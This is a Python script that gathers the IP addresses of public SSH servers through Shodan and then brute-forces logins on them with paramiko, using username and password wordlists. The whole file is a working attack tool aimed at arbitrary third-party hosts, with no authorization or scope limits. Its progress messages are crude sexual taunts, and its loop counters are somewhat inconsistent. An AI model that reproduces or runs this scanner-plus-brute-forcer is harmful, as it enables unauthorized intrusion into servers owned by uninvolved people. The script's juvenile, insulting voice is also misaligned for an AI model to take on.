import paramiko
from paramiko import SSHClient, AutoAddPolicy
import shodan
import time
paramiko.util.log_to_file("unwanted.log", level = "WARN")

API_KEY = ""
query = "ssh"
log = "log.txt"
user_file = "user.txt"
pass_file = "pass.txt"
update = 0
IP = 0
Users = 0
Passes = 0
print("Collecting IPs..")
client = SSHClient()
client.set_missing_host_key_policy(AutoAddPolicy())

# Setup the API 
api = shodan.Shodan(API_KEY)
result = api.search(query)



############# Cold ###########
def cold():
    for i in range(5):
        with open(log, 'w') as file:
            for service in result['matches']:
                IP = service['ip_str']
                file.write(IP)
                file.write("\n")
    file.close()
cold()


############# Prepare ##########
with open(log, 'r') as source0:
    nun = source0.read()
    bun = nun.strip().split("\n")
source0.close()

with open(user_file, 'r') as source1:
    A = source1.read()
    B = A.strip().split("\n")
source1.close()
   
with open(pass_file, 'r') as source2:
    C = source2.read()
    D = C.strip().split("\n")
source2.close()


print("Done. IPs stored within: {}".format(log))
time.sleep(1)
print("Initating Cumshot..")
time.sleep(3)
print("Currently Pumping your mother once more...")
time.sleep(1)
print("Attempting to insert my creds into her server(s)...")


############# Status ###########
def Failed():
    print("Failed: {}@{} with password: {}".format(B[Users], bun[IP], D[Passes]))

def Success():
    print("Successful: {}@{} with password: {}".format(B[Users], bun[IP], D[Passes]))


while(update < len(D)):
    try:
        client.connect(bun[IP], username=B[Users], password=D[Passes])
        Success()
        time.sleep(5)
        IP = IP + 1
        Users = Users + 1
        Passes = Passes + 1

    except paramiko.ssh_exception.AuthenticationException:
        Failed()
        Passes = Passes + 1

    except paramiko.ssh_exception.NoValidConnectionsError:
        pass

    except paramiko.ssh_exception.BadAuthenticationType:
        pass
    except paramiko.ssh_exception.SSHException:
        pass
    else:
        pass

    finally:
        update = update + 1

    if(update == len(D)):
        update = 0
        Passes = 0
        Users = Users + 1
        continue

    if(update == len(B)):
        Users = Users + 1
        continue

    if(update == len(bun)):
        print("All attempts at inserting my creds into your mother server(s) were unsuccessful")
        break

